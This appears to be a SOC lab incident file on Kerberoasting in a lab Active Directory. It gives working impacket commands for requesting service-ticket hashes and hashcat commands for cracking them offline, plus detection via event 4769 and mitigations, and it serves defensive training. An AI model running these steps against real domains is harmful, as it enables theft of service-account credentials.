# INC-003 — Kerberoasting

| Field | Value |
|-------|-------|
| **ID** | INC-003 |
| **Name** | Kerberoasting |
| **MITRE ATT&CK** | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) |
| **Date** | _fill in when executed_ |
| **Attacker** | Kali (172.16.0.11) |
| **Target** | DC — SOC-Lab-DC (172.16.0.5) |
| **Domain** | soc.lab |
| **Status** | 🔲 In Progress |

---

## 🧠 What is Kerberoasting?

Kerberoasting is an Active Directory attack where a **domain-authenticated user** requests a Kerberos Service Ticket (TGS) for any account with a Service Principal Name (SPN). The TGS is encrypted with the **service account's NTLM hash** and can be taken offline for cracking — no elevated privileges required.

**Why it works:** Any domain user can request a TGS for any SPN. This is by design in Kerberos — the attacker just abuses it.

---

## 🎯 Attack Prerequisites

- [x] Domain credentials (any low-priv user will do — use `svc_asrep:Password123!` from INC-002)
- [ ] Service account with an SPN registered on DC
- [ ] BloodHound installed on Kali (optional but recommended)

### Create the Target Service Account (on DC as Admin)

```powershell
# Create service account
New-ADUser -Name "svc_http" `
  -SamAccountName "svc_http" `
  -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
  -Enabled $true `
  -PasswordNeverExpires $true

# Register SPN
Set-ADUser svc_http -ServicePrincipalNames @{Add="HTTP/soc-lab-dc.soc.lab"}

# Verify SPN registered
Get-ADUser svc_http -Properties ServicePrincipalNames | Select -Expand ServicePrincipalNames
```

---

## ⚔️ Attack Steps (from Kali — 172.16.0.11)

### Step 1 — Enumerate SPNs
```bash
impacket-GetUserSPNs soc.lab/svc_asrep:Password123! \
  -dc-ip 172.16.0.5 \
  -request
```

**Expected output:**
```
ServicePrincipalName    Name      MemberOf  PasswordLastSet  LastLogon
----------------------  --------  --------  ---------------  ---------
HTTP/soc-lab-dc.soc.lab  svc_http            <date>           <never>

$krb5tgs$23$*svc_http$SOC.LAB$soc.lab/svc_http*$<hash>...
```

### Step 2 — Save Hash
```bash
impacket-GetUserSPNs soc.lab/svc_asrep:Password123! \
  -dc-ip 172.16.0.5 \
  -request \
  -outputfile kerberoast.hash

cat kerberoast.hash
```

### Step 3 — Crack Offline with Hashcat
```bash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt

# If cracked:
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --show
```

> Hash mode `13100` = Kerberos 5 TGS-REP etype 23 (RC4 — the weak encryption type `0x17`)

---

## 🔍 Detection

See [`detection.md`](./detection.md) for full KQL queries and Sigma rule.

**Key indicator:** Windows Security Event **4769** with `TicketEncryptionType: 0x17` (RC4-HMAC). RC4 is legacy and should never be requested by modern clients unless forced by an attacker.

| Event ID | Channel | What it shows |
|----------|---------|---------------|
| 4769 | Security | Kerberos Service Ticket request — look for EncryptionType 0x17 |
| 4768 | Security | TGT request (less useful here, but shows attacker auth) |

---

## 🛡️ Mitigation

| Control | Detail |
|---------|--------|
| **Enforce AES encryption** | Set `msDS-SupportedEncryptionTypes = 24` on service accounts (AES128 + AES256 only) — RC4 TGS requests fail |
| **Strong service account passwords** | 25+ char random password makes cracking infeasible |
| **Managed Service Accounts (gMSA)** | AD auto-rotates 120-char password — Kerberoasting hash is uncrackable |
| **Privilege reduction** | Service accounts should not have DA or high-priv group membership |
| **Alert on 4769 + EncType 0x17** | Any RC4 TGS request in a modern AD is suspicious |

---

## 📝 Notes

_Fill in during/after the attack:_

- Hash captured: `[ ]`
- Hash cracked: `[ ]` — cracked password: `____________`
- Time to crack: `____________`
- EID 4769 confirmed in Kibana: `[ ]`
- EncryptionType in event: `____________`
